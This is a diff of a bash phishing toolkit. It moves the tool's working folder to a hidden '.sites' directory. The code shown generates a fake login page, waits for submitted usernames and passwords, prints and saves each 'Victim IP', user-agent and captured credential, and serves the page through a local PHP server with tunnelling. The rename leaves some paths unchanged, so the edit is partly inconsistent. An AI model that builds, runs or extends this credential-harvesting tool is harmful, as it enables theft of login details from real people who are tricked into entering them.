@@ -701,36 +701,36 @@ pass_text="${pass_text:-${default_pass_text}}"
 read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
 sub_text="${sub_text:-${default_sub_text}}"
 
-echo "<!DOCTYPE html>" > sites/create/login.html
-echo "<html>" >> sites/create/login.html
-echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
+echo "<!DOCTYPE html>" > .sites/create/login.html
+echo "<html>" >> .sites/create/login.html
+echo "<body bgcolor=\"gray\" text=\"white\">" >> .sites/create/login.html
 IFS=$'\n'
-printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
+printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> .sites/create/login.html
 IFS=$'\n'
-printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
+printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> .sites/create/login.html
 IFS=$'\n'
-printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
+printf '<input type="text" name="username" length=64>\n' >> .sites/create/login.html
 IFS=$'\n'
-printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
+printf '<br><label>%s: </label>' $pass_text >> .sites/create/login.html
 IFS=$'\n'
-printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
+printf '<input type="password" name="password" length=64><br><br>\n' >> .sites/create/login.html
 IFS=$'\n'
 printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
-printf '</center>' >> sites/create/login.html
-printf '<body>\n' >> sites/create/login.html
-printf '</html>\n' >> sites/create/login.html
+printf '</center>' >> .sites/create/login.html
+printf '<body>\n' >> .sites/create/login.html
+printf '</html>\n' >> .sites/create/login.html
 
 
 }
 
 catch_cred() {
 
-account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
+account=$(grep -o 'Account:.*' .sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+password=$(grep -o 'Pass:.*' .sites/$server/usernames.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+cat .sites/$server/usernames.txt >> .sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
@@ -747,7 +747,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
 while [ true ]; do
 
 
-if [[ -e "sites/$server/usernames.txt" ]]; then
+if [[ -e ".sites/$server/usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
 
@@ -759,14 +759,14 @@ done
 }
 
 catch_ip() {
-touch sites/$server/saved.usernames.txt
+touch .sites/$server/saved.usernames.txt
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
+ua=$(grep 'User-Agent:' .sites/$server/ip.txt | cut -d '"' -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
-cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
+cat .sites/$server/ip.txt >> sites/$server/saved.ip.txt
 
 
 if [[ -e iptracker.log ]]; then
@@ -881,7 +881,7 @@ read port
 port="${port:-${def_port}}"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+cd .sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
 sleep 2
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://localhost:$port\e[0m\n"
@@ -896,7 +896,7 @@ read port
 port="${port:-${def_port}}"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+cd .sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
 sleep 2
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ..\e[0m\n"
